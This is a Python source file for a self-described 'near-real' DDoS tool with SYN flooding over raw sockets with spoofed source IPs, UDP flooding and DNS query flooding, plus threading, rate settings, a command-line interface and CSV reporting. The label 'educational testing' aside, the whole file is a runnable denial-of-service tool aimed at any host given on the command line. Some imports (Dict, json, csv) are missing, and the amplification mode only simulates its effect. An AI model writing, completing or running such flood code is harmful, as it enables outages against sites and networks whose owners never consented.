import asyncio
import argparse
import logging
import random
import time
import os
import socket
import struct
import threading
from concurrent.futures import ThreadPoolExecutor
import signal

# Configure logging
logging.basicConfig(
    filename='ddos_attack.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Default configuration
DEFAULT_CONFIG = {
    "target_host": "yourwebsite.com",  # Replace with your domain/IP
    "target_port": 80,
    "workers": 50,  # High concurrency
    "rate": 1000,  # Packets/requests per second per worker
    "duration": 60,
    "attack_type": "syn",  # syn, udp, amplify
    "payload_size": 1024,
    "spoof_ips": True,
    "dns_server": "8.8.8.8"  # For amplification
}

# Stats tracking
stats = {
    "packets": 0, "errors": 0, "start_time": time.time(), "bytes_sent": 0
}

class DDoSAttacker:
    """Near-real DDoS attack tool for educational testing."""
    def __init__(self, config: Dict):
        self.target_host = config["target_host"]
        self.target_port = config["target_port"]
        self.workers = config["workers"]
        self.rate = config["rate"]
        self.duration = config["duration"]
        self.attack_type = config["attack_type"].lower()
        self.payload_size = config["payload_size"]
        self.spoof_ips = config["spoof_ips"]
        self.dns_server = config["dns_server"]
        self.running = True
        self.lock = threading.Lock()
        signal.signal(signal.SIGINT, self._handle_stop)

    def _handle_stop(self, signum, frame):
        """Graceful shutdown with summary."""
        self.running = False
        elapsed = time.time() - stats["start_time"]
        pkt_per_sec = stats["packets"] / elapsed if elapsed > 0 else 0
        bandwidth_used = stats["bytes_sent"] / elapsed if elapsed > 0 else 0
        logging.info(f"Attack stopped. Packets: {stats['packets']}, Errors: {stats['errors']}, Time: {elapsed:.2f}s, Pkt/s: {pkt_per_sec:.2f}, Bandwidth: {bandwidth_used:.2f} B/s")
        print(f"\nAttack stopped.")
        print(f"Packets: {stats['packets']} | Errors: {stats['errors']}")
        print(f"Elapsed: {elapsed:.2f}s | Rate: {pkt_per_sec:.2f} pkt/s")
        print(f"Bandwidth Used: {bandwidth_used:.2f} B/s")
        print("Details in 'ddos_attack.log'.")
        self._export_report(elapsed, pkt_per_sec, bandwidth_used)

    def _random_ip(self) -> str:
        """Generate a random IP for spoofing simulation."""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

    def _create_syn_packet(self, src_ip: str, src_port: int) -> bytes:
        """Craft a raw SYN packet."""
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 20 + 20, random.randint(0, 65535), 0, 64, 6, 0,  # IP header
            socket.inet_aton(src_ip), socket.inet_aton(self.target_host))
        tcp_header = struct.pack('!HHLLBBHHH',
            src_port, self.target_port, 0, 0, 5 << 4, 2, 1024, 0, 0)  # SYN flag
        return ip_header + tcp_header

    def _create_dns_query(self) -> bytes:
        """Craft a DNS query for amplification simulation."""
        dns_id = random.randint(0, 65535)
        dns_header = struct.pack('!HHHHHH', dns_id, 0x0100, 1, 0, 0, 0)
        qname = b''.join(bytes([len(part)]) + part.encode() for part in self.target_host.split('.')) + b'\x00'
        question = qname + struct.pack('!HH', 1, 1)  # A record, IN class
        return dns_header + question

    def _syn_flood(self, worker_id: int):
        """Raw SYN flood attack."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        while self.running:
            try:
                src_ip = self._random_ip() if self.spoof_ips else "127.0.0.1"
                src_port = random.randint(1024, 65535)
                packet = self._create_syn_packet(src_ip, src_port)
                sock.sendto(packet, (self.target_host, self.target_port))
                with self.lock:
                    stats["packets"] += 1
                    stats["bytes_sent"] += len(packet)
                time.sleep(1 / self.rate)
            except Exception as e:
                with self.lock:
                    stats["errors"] += 1
                logging.error(f"Worker {worker_id} (SYN) failed: {str(e)}")
        sock.close()

    def _udp_flood(self, worker_id: int):
        """Raw UDP flood attack."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(self.payload_size)
        while self.running:
            try:
                sock.sendto(payload, (self.target_host, self.target_port))
                with self.lock:
                    stats["packets"] += 1
                    stats["bytes_sent"] += len(payload)
                time.sleep(1 / self.rate)
            except Exception as e:
                with self.lock:
                    stats["errors"] += 1
                logging.error(f"Worker {worker_id} (UDP) failed: {str(e)}")
        sock.close()

    def _amplify_flood(self, worker_id: int):
        """DNS amplification simulation."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_query = self._create_dns_query()
        while self.running:
            try:
                sock.sendto(dns_query, (self.dns_server, 53))
                amplified_size = len(dns_query) * 10  # Simulated amplification factor
                with self.lock:
                    stats["packets"] += 1
                    stats["bytes_sent"] += amplified_size
                time.sleep(1 / self.rate)
            except Exception as e:
                with self.lock:
                    stats["errors"] += 1
                logging.error(f"Worker {worker_id} (Amplify) failed: {str(e)}")
        sock.close()

    def _worker(self, worker_id: int):
        """Worker thread for attack type."""
        attack_func = {
            "syn": self._syn_flood,
            "udp": self._udp_flood,
            "amplify": self._amplify_flood
        }.get(self.attack_type, self._udp_flood)
        attack_func(worker_id)

    def _export_report(self, elapsed: float, pkt_per_sec: float, bandwidth_used: float):
        """Export report to CSV."""
        with open('report.csv', 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(["Metric", "Value"])
            writer.writerow(["Total Packets", stats["packets"]])
            writer.writerow(["Errors", stats["errors"]])
            writer.writerow(["Elapsed Time (s)", f"{elapsed:.2f}"])
            writer.writerow(["Packet Rate (pkt/s)", f"{pkt_per_sec:.2f}"])
            writer.writerow(["Bandwidth Used (B/s)", f"{bandwidth_used:.2f}"])

    def run(self):
        """Run the DDoS attack."""
        logging.info(f"Starting {self.attack_type.upper()} attack on {self.target_host}:{self.target_port} with {self.workers} workers")
        print(f"Starting {self.attack_type.upper()} DDoS Attack")
        print(f"Target: {self.target_host}:{self.target_port} | Workers: {self.workers} | Rate: {self.rate} pkt/s/worker")
        print(f"Duration: {self.duration or 'Indefinite'}")
        if self.attack_type in ['udp', 'syn', 'amplify']:
            print(f"Payload Size: {self.payload_size} bytes")
        if self.spoof_ips:
            print("IP Spoofing Simulation: Enabled")
        print("Press Ctrl+C to stop.")

        threads = []
        for i in range(self.workers):
            t = threading.Thread(target=self._worker, args=(i,))
            t.daemon = True
            threads.append(t)
            t.start()

        try:
            if self.duration:
                time.sleep(self.duration)
            else:
                while self.running:
                    time.sleep(1)
        except KeyboardInterrupt:
            pass
        self.running = False
        for t in threads:
            t.join()

def load_config(file_path: str = "config.json") -> Dict:
    """Load configuration from JSON."""
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            return json.load(f)
    return DEFAULT_CONFIG

def parse_args():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(description="Near-Real DDoS Attack Tool")
    parser.add_argument('--config', default="config.json", help="Path to config JSON")
    parser.add_argument('--host', help="Target host (domain or IP)")
    parser.add_argument('--port', type=int, help="Target port")
    parser.add_argument('--workers', type=int, help="Number of workers")
    parser.add_argument('--rate', type=float, help="Packets per second per worker")
    parser.add_argument('--duration', type=float, help="Duration in seconds")
    parser.add_argument('--type', choices=['syn', 'udp', 'amplify'], help="Attack type")
    parser.add_argument('--payload', type=int, help="Payload size in bytes")
    parser.add_argument('--spoof-ips', action='store_true', help="Simulate IP spoofing")
    parser.add_argument('--dns-server', help="DNS server for amplification")
    args = parser.parse_args()

    config = load_config(args.config)
    if args.host: config["target_host"] = args.host
    if args.port: config["target_port"] = args.port
    if args.workers: config["workers"] = args.workers
    if args.rate: config["rate"] = args.rate
    if args.duration is not None: config["duration"] = args.duration
    if args.type: config["attack_type"] = args.type
    if args.payload: config["payload_size"] = args.payload
    if args.spoof_ips: config["spoof_ips"] = True
    if args.dns_server: config["dns_server"] = args.dns_server
    return config

if __name__ == "__main__":
    config = parse_args()
    attacker = DDoSAttacker(config)
    try:
        attacker.run()
    except PermissionError:
        print("Error: This tool requires root privileges for raw socket access (e.g., 'sudo python ddos_tool_real.py').")
    except Exception as e:
        print(f"Error: {str(e)}")
